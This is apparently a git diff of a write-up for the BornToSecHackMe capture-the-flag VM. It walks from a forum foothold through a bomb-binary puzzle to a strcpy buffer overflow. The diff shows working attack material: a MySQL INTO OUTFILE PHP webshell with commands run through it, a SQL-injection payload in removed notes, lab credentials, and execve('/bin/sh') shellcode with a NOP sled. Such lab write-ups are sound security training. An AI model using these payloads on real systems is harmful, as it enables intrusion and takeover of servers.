@@ -125,12 +125,12 @@ A little bit of snooping through the account we get lmezard's (or as it turns ou
 And here we have a list of other forum users:
 ```
     Username [asc]	Type
-    admin			Admin
-    lmezard		    User
-    qudevide		User
-    thor			User	 	 
-    wandre		    User
-    zaz			    User
+    admin           Admin
+    lmezard         User
+    qudevide        User
+    thor            User	 	 
+    wandre          User
+    zaz             User
 ```
 
 Now we know that laurie is careless so I am going to check their login:password combination on ssh, ftp, phpmyadmin and webmail.
@@ -173,38 +173,13 @@ Here is a final backdoor setup command:
     SELECT '<? system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
 ```
 
-***************************ToDelete***************************
-Для целей этой демонстрации мы предположим, что корневой веб-каталог Apache по умолчанию ( / var / www / ) используется с общедоступными разрешениями на запись.
-Информацию о веб-сервере, включая корневой каталог, обычно можно найти в файле «phpinfo.php»
-
-templates_c used for compiled templates, but without the actual content, that can be dynamically inserted into them.
-Smarty is a template engine for PHP.
-This is the name of the directory where compiled templates are located.
-By default this is ./templates_c, meaning that Smarty will look for the templates_c/ directory in the same directory as the executing php script.
-This directory must be writeable by the web server
-
-
-insert into backdoor(script) values("<?php echo exec($_GET['cmd'];?>");
-select * into outfile "/var/www/backdoor.php" from backdoor;
-http://localhost/backdoor.php?cmd=uname -a
-
-Now remember, we want to insert our own PHP code so we can run shell commands.
-To do this, we use the INTO OUTFILE feature that MySQL provides.
-Using INTO OUTFILE, it is possible for the output of a query to be redirected into a file on the operating system.
-we’ll use some very basic PHP code that will read an argument from the URL and run a command against the operating system, using it as an input.
-Here is the input that we will give: Harry Potter’ union select “<? system($_REQUEST[‘cmd’]); ?>”,2,3 INTO OUTFILE ‘/var/www/test/execcmd.php’#
-
-SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
-**************************************************************
-
 We have our backdoor, time to check and use it:
+
 ```
     https://192.168.31.134/forum/templates_c/backdoor.php?cmd=pwd
     /var/www/forum/templates_c
 
-    url-encoding space: %20
-
-    // ---
+    ---------------------------------------------------------------------------------------------------
 
     https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la
     total 455
@@ -212,12 +187,14 @@ We have our backdoor, time to check and use it:
     -rw-rw-rw- 1 mysql mysql 31 Dec 29 14:42 backdoor.php -rw-rw-rw- 1 mysql mysql 28 Dec 29 14:46 backdoor2.php
     [...]
 
-    // ---
+    Note: `%20` - url-encoding for space
+
+    ---------------------------------------------------------------------------------------------------
 
     https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20/home
     LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
 
-    // ---
+    ---------------------------------------------------------------------------------------------------
 
     https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la%20/home
     total 0
@@ -231,25 +208,25 @@ We have our backdoor, time to check and use it:
     drwxr-x--- 3 thor thor 129 Oct 15 2015 thor 
     drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
 
-    // ---
+    ---------------------------------------------------------------------------------------------------
 
-    https://192.168.31.134/forum/templates_c/backdoor2.php?cmd=ls%20-la%20/home/LOOKATME
+    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la%20/home/LOOKATME
     total 1 drwxr-x--- 2 www-data www-data 31 Oct 8 2015 . 
     drwxrwx--x 9 www-data root 126 Oct 13 2015 .. -rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password
 
-    // ---
+    ---------------------------------------------------------------------------------------------------
 
-    https://192.168.31.134/forum/templates_c/backdoor2.php?cmd=cat%20/home/LOOKATME/password
+    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
     lmezard:G!@M6f4Eatau{sF"
 ```
 
 We have new login:password combination: `lmezard:G!@M6f4Eatau{sF"`
-We will try it everywhere and it works for ftp
-- doesn't work on ssh
-- inside vm this login:password works
-- and works on ftp
+We will try to use this combination everywhere and it works for ftp
+
 
 ## FTP
+
+Let's connect to ftp and get any files stored there:
 
 ```
     daniseed@DESKTOP:~$ ftp
@@ -285,7 +262,8 @@ We will try it everywhere and it works for ftp
     808960 bytes received in 0.08 secs (9.2939 MB/s)
 ```
 
-We got 2 files out of this:
+We got 2 files out of this "REDME" and "fun":
+
 ```
     daniseed@DESKTOP:~$ cat README
     Complete this little challenge and use the result as password for user 'laurie' to login in ssh
@@ -295,7 +273,7 @@ We got 2 files out of this:
 
 ### ft_fun
 
-fun file is an archive full of `.pcap` files but WireShark and `file` command tells us that they are not real 
+"fun" file is an archive full of `.pcap` files but WireShark and `file` command tells us that they are not real 
 ```
     daniseed@DESKTOP:~$ tar -xvf fun
     ft_fun/
@@ -308,32 +286,9 @@ fun file is an archive full of `.pcap` files but WireShark and `file` command te
 
     //file679
 ```
-This fake .pcap files are numbered and have parts of code in them.
-If we sort .pcap files by their numbers with `not_pcap_sort.py` script and run the output we can get a password for something
+This fake .pcap files are numbered and have what looks to be parts of code in them.
+If we sort .pcap files by their numbers with `not_pcap_sort.py` script we get a program like this (shortened for convenience):
 
-HERE
-sort pcap files by numbers: 
-
-daniseed@DESKTOP:~$ cat not_pcap_sort.py
-# ! /usr/bin/env python3
-import os
-import re
-import sys
-
-dict = {}
-
-
-for filename in os.listdir("/home/daniseed/ft_fun"):
-    with open(os.path.join("/home/daniseed/ft_fun", filename)) as f:
-        txt = f.read()
-        f.close()
-        nbr_line = re.search(r'//file([0-9]*)', txt)
-        dict[int(nbr_line.group(1))] = txt
-
-for k, v in sorted(dict.items()):
-    print(k, v)
-```
-python3 not_pcap_sort.py > pcap.c
 ```
 char getme1() {
 	return 'I';
@@ -372,17 +327,25 @@ int main() {
         printf("\n");
         printf("Now SHA-256 it and submit");
 }
+```
+After we run this c-program we get this:
 
+```
 gcc pcap.c
 daniseed@DESKTOP:~$ ./a.out
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit
+```
 
-https://emn178.github.io/online-tools/sha256.html
-330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+After encrypting this password with [SHA-256](https://emn178.github.io/online-tools/sha256.html) we can have our password for laurie's ssh: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
 
+## SSH
 
+### laurie
 
+After we login as laurie we check whether there are any new puzzles for us and there are:
+
+```
 laurie@BornToSecHackMe:~$ ls
 bomb  README
 laurie@BornToSecHackMe:~$ cat README
@@ -407,8 +370,13 @@ P
 BOOM!!!
 The bomb has blown up.
 
+```
 
+So it looks like we have to "diffuse the bomb" by discovering solutions for 6 challenges. Disassembling each level is going to be the way to go. We will be using gdb and Ghidra(to help with interpreting assembly).
 
+#### Level1
+
+```
 (gdb) disass phase_1
 Dump of assembler code for function phase_1:
    0x08048b20 <+0>:     push   %ebp
@@ -429,7 +397,14 @@ Dump of assembler code for function phase_1:
 End of assembler dump.
 (gdb) x /s 0x80497c0
 0x80497c0:       "Public speaking is very easy."
+```
+This level is easy. Input is compared with a simple string stored in the same function.
 
+**Answer:** `Public speaking is very easy.`
+
+#### Level2
+
+```
 (gdb) disass phase_2
 Dump of assembler code for function phase_2:
    0x08048b48 <+0>:     push   %ebp
@@ -444,14 +419,14 @@ Dump of assembler code for function phase_2:
    0x08048b5a <+18>:    push   %edx
    0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
    0x08048b60 <+24>:    add    $0x10,%esp
-   0x08048b63 <+27>:    cmpl   $0x1,-0x18(%ebp)			six_numbers[0] >= 1
+   0x08048b63 <+27>:    cmpl   $0x1,-0x18(%ebp)             // six_numbers[0] >= 1
    0x08048b67 <+31>:    je     0x8048b6e <phase_2+38>
    0x08048b69 <+33>:    call   0x80494fc <explode_bomb>
    0x08048b6e <+38>:    mov    $0x1,%ebx
    0x08048b73 <+43>:    lea    -0x18(%ebp),%esi
    0x08048b76 <+46>:    lea    0x1(%ebx),%eax
-   0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax 	six_numbers[i - 1] * (i + 1) 	
-   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)		six_numbers[i] != six_numbers[i - 1] * (i + 1) 
+   0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax       // six_numbers[i - 1] * (i + 1) 	
+   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)           // six_numbers[i] != six_numbers[i - 1] * (i + 1) 
    0x08048b81 <+57>:    je     0x8048b88 <phase_2+64>
    0x08048b83 <+59>:    call   0x80494fc <explode_bomb>
    0x08048b88 <+64>:    inc    %ebx
@@ -464,27 +439,34 @@ Dump of assembler code for function phase_2:
    0x08048b95 <+77>:    pop    %ebp
    0x08048b96 <+78>:    ret
 End of assembler dump.
+```
+This code translates to pseudo code like this:
 
+```
 i = 1
 do {
 	if (six_numbers[i] == six_numbers[i - 1] * (i + 1))
-		i++
+		++i
 	else
 		fail
 } while (i <= 5)
+```
 
-i: six_numbers
-0: 1				| 
-1: 1 * (1 + 1) = 2	|
-2: 2 * (2 + 1) = 6	| 
-3: 6 * (3 + 1) = 24	|
-4: 24 * (4 + 1) = 120	|
-5: 120 * (5 + 1) = 720	|
+Here the program awaits 6 numbers as input and from the hint we know that the second number is "2".
+With this calculating other numbers is trivial: 
 
-1 2 6 24 120 720
+> 0: 1                      | 
+> 1: 1 * (1 + 1) = 2        |
+> 2: 2 * (2 + 1) = 6        | 
+> 3: 6 * (3 + 1) = 24       |
+> 4: 24 * (4 + 1) = 120     |
+> 5: 120 * (5 + 1) = 720    |
 
+**Answer:** `1 2 6 24 120 720`
 
+#### Level3
 
+```
 (gdb) disass phase_3
 Dump of assembler code for function phase_3:
    0x08048b98 <+0>:     push   %ebp
@@ -563,8 +545,10 @@ Dump of assembler code for function phase_3:
    0x08048c9e <+262>:   pop    %ebp
    0x08048c9f <+263>:   ret
 End of assembler dump
+```
+Pseudo code of the main part of this phase:
 
-
+```
 switch(first) {
 case 0:
     c = 'q';
@@ -604,12 +588,18 @@ default:
 }
 if (c != second)
     fail
+```
 
-hint for this is b so we have 3 possibilities:
-1 b 214
-2 b 755
-7 b 524
+From this program we can see that the required input consists of 3 parts - number, letter and another number.
+From disassemply we know all correct inputs and the hint for this phase is "b" so we have 3 possible answers:
+> 1 b 214
+> 2 b 755
+> 7 b 524
 
+*This unfortunately makes finding the password for thor difficult*
+
+#### Level4
+```
 (gdb) disass phase_4
 Dump of assembler code for function phase_4:
    0x08048ce0 <+0>:     push   %ebp
@@ -670,8 +660,10 @@ Dump of assembler code for function func4:
    0x08048cdc <+60>:    pop    %ebp
    0x08048cdd <+61>:    ret
 End of assembler dump.
+```
+Pseudo code for these 2 functions:
 
-
+```
 int func4(int nbr) {
     if (nbr <= 1)
         return 1;
@@ -692,10 +684,15 @@ void phase_4(char *str) {
     }
     return;
 }
+```
 
-It should be a number between 1 and 9. By recreating this programm and trying each one we find out that 9 is the answer
-9
+Input should be a number between 1 and 9. By recreating this program and trying each one we find out that 9 is the answer
 
+**Answer:** 9
+
+#### Level5
+
+```
 (gdb) disass phase_5
 Dump of assembler code for function phase_5:
    0x08048d2c <+0>:     push   %ebp
@@ -739,9 +736,10 @@ Dump of assembler code for function phase_5:
    0x08048d93 <+103>:   pop    %ebp
    0x08048d94 <+104>:   ret
 End of assembler dump.
+```
+Pseudo code:
 
-
-
+```
 void phase_5(char *str) {
     int l = string_length(line);
     if (l != 6)
@@ -757,38 +755,10 @@ void phase_5(char *str) {
     }
     return;
 }
+```
+This simple program will hepl us discover letter correlation for this phase:
 
-opekma
-opukmq
-
-a -> s
-b -> r
-c -> v
-d -> e
-e -> a
-f -> w
-g -> h
-h -> o
-i -> b
-j -> p
-k -> n
-l -> u
-m -> t
-n -> f
-o -> g
-p -> i
-q -> s
-r -> r
-s -> v
-t -> e
-u -> a
-v -> w
-w -> h
-x -> o
-y -> b
-z -> p
-
-
+```
 #include <unistd.h>
 #include <stdio.h>
 int main() {
@@ -805,18 +775,21 @@ int main() {
         printf("%s\n", res);
         return 0;
 }
+```
 
-abcdefghijklmnopqrstuvwxyz
-srveawhobpnutfgisrveawhobp
+> abcdefghijklmnopqrstuvwxyz
+> srveawhobpnutfgisrveawhobp
 
+As some letters are repeated there are 4 different encodings for giant:
+> opekma
+> opekma
+> opekmq
+> opukmq
 
-result: opukmq
-other options: opekma, opukma, opekmq
+*Another level with several possible options for password. Fun*
 
-Another one with several possible options for password. F
-
-
-
+#### Level6
+```
 (gdb) disass phase_6
 Dump of assembler code for function phase_6:
    0x08048d98 <+0>:     push   %ebp
@@ -912,7 +885,6 @@ Dump of assembler code for function phase_6:
    0x08048e90 <+248>:   ret
 End of assembler dump.
 
-
 (gdb) info var
 All defined variables:
 
@@ -931,29 +903,34 @@ Non-debugging symbols:
 0x0804b260  node2				// 725
 0x0804b26c  node1				// 253
 [...]
+```
 
+Phase 6 requires to input 6 numbers. It also somehow sorts 6 global variables and compares the result with the order we provide by our 6 input numbers.
+As the hint for this phase is "4" and node4 is the biggest so let's sort numbers in descending order:
+`4 2 6 3 1 5`
 
-Phase 6 requires to input 6 numbers. It also sorts 6 global variables and compares the way we input the numbers should be sorted with the default way.
-The clue is 4 and node4 is the biggest so lets sort numbers as:
-4 2 6 3 1 5 
+**Answer:** `4 2 6 3 1 5`
 
-HINT:
-P
- 2
- b
+#### Diffusing the bomb
 
-o
-4
+> HINT:
+> P
+>  2
+>  b
+> 
+> o
+> 4
 
 Final answers:
-1) Public speaking is very easy.  
-2) 1 2 6 24 120 720
-3) 1 b 214 OR 2 b 755 OR 7 b 524
-4) 9
-5) opukmq OR opekma OR opukma OR opekmq
-6) 4 2 6 3 1 5 
 
+> 1) Public speaking is very easy.  
+> 2) 1 2 6 24 120 720
+> 3) 1 b 214 || 2 b 755 || 7 b 524
+> 4) 9
+> 5) opukmq || opekma || opukma || opekmq
+> 6) 4 2 6 3 1 5 
 
+```
 laurie@BornToSecHackMe:~$ ./bomb
 Welcome this is my little bomb !!!! You have 6 stages with
 only one life good luck !! Have a nice day!
@@ -969,11 +946,11 @@ opekmq
 Good work!  On to the next...
 4 2 6 3 1 5
 Congratulations! You've defused the bomb!
-
-All these variations work for diffusing the bomb so I quite hate the creators of this challenge right now.
-We will have to try several possible passwords to become thor.
+```
+The problem is that all these variations work for diffusing the bomb and so we will have to try several possible passwords to become `thor`:
 
 Possible passwords:
+```
 Publicspeakingisveryeasy.126241207201b2149opukmq426315  -> No
 Publicspeakingisveryeasy.126241207201b2149opekma426315  -> No
 Publicspeakingisveryeasy.126241207201b2149opukma426315  -> No
@@ -986,24 +963,24 @@ Publicspeakingisveryeasy.126241207207b5249opukmq426315  -> No
 Publicspeakingisveryeasy.126241207207b5249opekma426315  -> No
 Publicspeakingisveryeasy.126241207207b5249opukma426315  -> No
 Publicspeakingisveryeasy.126241207207b5249opekmq426315  -> No
+```
 
-After some choice words and googling... There is an error and last numbers in phase 6 should be moved around: 4 2 6 1 3 5
+So none of the possible passwords work. As it turns out there is an error in phase_6 answer.
+It should be `4 2 6 1 3 5`
 
 Time to try this once again...
 This worked:
-Publicspeakingisveryeasy.126241207201b2149opekmq426135
+`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
-The hate lives in me
+*Why this error prevails is a mistery*
 
+### thor
+```
 thor@BornToSecHackMe:~$ ls
 README  turtle
 
 thor@BornToSecHackMe:~$ cat README
 Finish this challenge and use the result as password for 'zaz' user.
-
-Let's hope that this is not another series of reverse-ctf puzzles
-
-
 
 thor@BornToSecHackMe:~$ ./turtle
 ./turtle: line 1: Tourne: command not found
@@ -1016,7 +993,7 @@ thor@BornToSecHackMe:~$ ./turtle
 ./turtle: line 1471: syntax error near unexpected token `)'
 ./turtle: line 1471: `Can you digest the message? :)'
 
-cat turtle
+thor@BornToSecHackMe:~$ cat turtle
 Tourne gauche de 90 degrees
 Avance 50 spaces
 Avance 1 spaces
@@ -1027,11 +1004,10 @@ Avance 100 spaces
 Recule 200 spaces
 
 Can you digest the message? :)
-
-It is a series of directional steps to draw a picture. Lets write python scipt to see it:
-
-
-
+```
+Thor has another challenge for us that looks like a series of directional steps to draw a picture(like in children's programing games). Lets write python scipt to draw the picture:
+ 
+```
 #! /usr/bin/env python3
 
 from turtle import *
@@ -1061,30 +1037,18 @@ for line in file.readlines():
     else:
         print(line)
 file.close()
+```
 
+The art obtained spells `SLASH` and turtle file asks us "Can you digest the message? :)"
 
+Just `SLASH` doesn't work as zaz's password so we have to think some more.
+The word "message" in the last line of turtle is a clue for us. It hints at md5 encryption.
+[MD5 or the MD5 Message Digest algorithm](https://www.md5.cz/) is an ecryption method so we will try to use it to encrypt `SLASH`:
+`646da671ca01bb5d84dbb5fb2238dc8e`
 
-This piece of modern art spells SLASH and asks "Can you digest the message? :)"
+### zaz
 
-Just SLASH doesn't work for zaz so we have to think some more
-
-MD5 - Passwords are encrypted by the MD5 Message Digest algorithm before they are stored in the directory.
-
-Word "message" in the last line of turtle is a hint fro md5 encryption
-
-646da671ca01bb5d84dbb5fb2238dc8e
-
-
- ssh zaz@192.168.31.134
-        ____                _______    _____
-       |  _ \              |__   __|  / ____|
-       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
-       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
-       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
-       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
-
-                       Good luck & Have fun
-zaz@192.168.31.134's password:
+```
 zaz@BornToSecHackMe:~$ ls
 exploit_me  mail
 zaz@BornToSecHackMe:~$ ls -la
@@ -1105,7 +1069,9 @@ INBOX.Drafts  INBOX.Sent  INBOX.Trash
 
 zaz@BornToSecHackMe:~$ ./exploit_me aaa
 aaa
-
+```
+Zaz has for us another puzzle but no hints. Let's start as always with gdb:
+```
 zaz@BornToSecHackMe:~$ gdb ./exploit_me
 (gdb) disass main
 Dump of assembler code for function main:
@@ -1131,22 +1097,11 @@ Dump of assembler code for function main:
    0x08048436 <+66>:    leave
    0x08048437 <+67>:    ret
 End of assembler dump.
+```
 
+As there is a `strcpy` function which makes this program vulnerable to buffer overflow. We can use this to find the offset and rewrite EIP register. The offset can be calculated manually but it is quicker to use [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
 
-I'm lazy so 
-
-zaz@BornToSecHackMe:~$ ./exploit_me `cat /etc/passwd`
-root:x:0:0:root:/root:/bin/bash
-zaz@BornToSecHackMe:~$ ./exploit_me `cat /etc/shadow`
-cat: /etc/shadow: Permission denied
-
-Second x means that password is stred in /etc/shadow file
-
-
-
-
-https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-
+```
 zaz@BornToSecHackMe:~$ gdb ./exploit_me
 (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
@@ -1154,169 +1109,21 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 Program received signal SIGSEGV, Segmentation fault.
 0x37654136 in ?? ()
+```
 
+Offset is 140
 
-Offset 140
+Now we will overwrite EIP to jump to the sellcode which executes `/bin/bash` command. This shellcode we will store in environment variable.
 
-zaz@BornToSecHackMe:~$ ltrace ./exploit_me aaaaaaaaaaaaaa
-__libc_start_main(0x80483f4, 2, 0xbffff7f4, 0x8048440, 0x80484b0 <unfinished ...>
-strcpy(0xbffff6d0, "aaaaaaaaaaaaaa")                                                                      = 0xbffff6d0
-puts("aaaaaaaaaaaaaa"aaaaaaaaaaaaaa
-)                                                                                    = 15
-+++ exited (status 0) +++
+[shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html) for `execve("/bin/sh")`:
+`"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`.
+It is 23 bytes long.
 
-Input is stored at 0xbffff6d0
+To include room for error in our jump to shellcode we will buffer it with nop instructions so it will look like this: `python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 
+After creating the env variable we will want to find it's address:
 
-[shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html):
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-
-Shellcode for `execve("/bin/sh")` from [here](https://shell-storm.org/shellcode/files/shellcode-575.html):
-"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-
-
-* 23 bytes -> shellcode
-* 117 bytes (140 - 23) -> padding
-* 4 bytes -> 0xbffff6d0
-
-python -c 'print "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 67 + "\xd0\xf6\xff\xbf"'
-
-
-"\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh"
-`python -c 'print "\x90" * 50 + "\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh" + "a" * 52 + "\xd0\xf6\xff\xbf"'`
-
-
-
-saving shellcode in buffer doesn't work so env variable:
-
-zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
-zaz@BornToSecHackMe:~$ gdb ./exploit_me
-(gdb) b main
-Breakpoint 1 at 0x80483f7
-(gdb) r
-Starting program: /home/zaz/exploit_me
-
-Breakpoint 1, 0x080483f7 in main ()
-(gdb) x/10s *((char**)environ)
-0xbffff8d5:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
-0xbffff929:      "SHELL=/bin/bash"
-0xbffff939:      "TERM=xterm-256color"
-0xbffff94d:      "SSH_CLIENT=192.168.31.1 61936 22"
-0xbffff96e:      "SSH_TTY=/dev/pts/0"
-0xbffff981:      "USER=zaz"
-0xbffff98a:      "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
-0xbffffa52:      ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
-0xbffffb1a:      "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
-0xbffffbe2:      ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
-
-
-0xbffff8d5 -> /xd5/xf8/xff/xbf
-
-(gdb) x /150xg 0xbffff8d5
-0xbffff8d5:     0x444f434c4c454853      0x9090909090903d45
-0xbffff8e5:     0x9090909090909090      0x9090909090909090
-0xbffff8f5:     0x9090909090909090      0x9090909090909090
-0xbffff905:     0x9090909090909090      0x6850c03190909090
-0xbffff915:     0x69622f6868732f2f      0xb0e1895350e3896e
-0xbffff925:     0x4c4548530080cd0b      0x622f6e69622f3d4c
-0xbffff935:     0x4d52455400687361      0x322d6d726574783d
-
-
-
-Address in nop sled
-0xbffff8f5 -> /xf5/xf8/xff/xbf
-
-`python -c 'print "A" * 140 + "/xdf/xf8/xff/xbf"`
-
-
-0xbffff8c7 
-
-0xbffff8e7   `python -c 'print "A" * 140 + "/xe7/xf8/xff/xbf"'`
-
-
-it doesn't work :(
-
-
-
-
-zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
-zaz@BornToSecHackMe:~$ gdb ./exploit_me
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
-(gdb) b main
-Breakpoint 1 at 0x80483f7
-(gdb) r
-Starting program: /home/zaz/exploit_me
-
-Breakpoint 1, 0x080483f7 in main ()
-(gdb) x/s *((char **)environ+0)
-0xbffff56d:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
-(gdb) x/150xg 0xbffff56d
-0xbffff56d:     0x444f434c4c454853      0x9090909090903d45
-0xbffff57d:     0x9090909090909090      0x9090909090909090
-0xbffff58d:     0x9090909090909090      0x9090909090909090
-0xbffff59d:     0x9090909090909090      0x9090909090909090
-0xbffff5ad:     0x9090909090909090      0x9090909090909090
-0xbffff5bd:     0x9090909090909090      0x9090909090909090
-0xbffff5cd:     0x9090909090909090      0x9090909090909090
-0xbffff5dd:     0x9090909090909090      0x9090909090909090
-0xbffff5ed:     0x9090909090909090      0x9090909090909090
-0xbffff5fd:     0x9090909090909090      0x9090909090909090
-0xbffff60d:     0x9090909090909090      0x9090909090909090
-0xbffff61d:     0x9090909090909090      0x9090909090909090
-0xbffff62d:     0x9090909090909090      0x9090909090909090
-0xbffff63d:     0x9090909090909090      0x9090909090909090
-0xbffff64d:     0x9090909090909090      0x9090909090909090
-0xbffff65d:     0x9090909090909090      0x9090909090909090
-0xbffff66d:     0x9090909090909090      0x9090909090909090
-0xbffff67d:     0x9090909090909090      0x9090909090909090
-0xbffff68d:     0x9090909090909090      0x9090909090909090
-0xbffff69d:     0x9090909090909090      0x9090909090909090
-0xbffff6ad:     0x9090909090909090      0x9090909090909090
-0xbffff6bd:     0x9090909090909090      0x9090909090909090
-0xbffff6cd:     0x9090909090909090      0x9090909090909090
-0xbffff6dd:     0x9090909090909090      0x9090909090909090
-0xbffff6ed:     0x9090909090909090      0x9090909090909090
-0xbffff6fd:     0x9090909090909090      0x9090909090909090
-0xbffff70d:     0x9090909090909090      0x9090909090909090
-0xbffff71d:     0x9090909090909090      0x9090909090909090
